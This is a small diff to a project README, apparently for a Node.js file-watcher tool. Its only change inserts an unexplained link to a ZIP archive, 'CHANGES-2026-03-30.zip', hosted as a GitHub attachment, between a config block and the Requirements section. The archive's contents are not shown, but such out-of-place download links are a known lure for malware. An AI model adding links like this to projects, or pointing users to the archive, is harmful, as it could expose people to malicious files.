@@ -141,7 +141,7 @@ watcher:
   debounceMs: 500
   minIntervalMs: 2000
 ```
-
+[CHANGES-2026-03-30.zip](https://github.com/user-attachments/files/26358345/CHANGES-2026-03-30.zip)
 ## Requirements
 
 - Node.js 20+
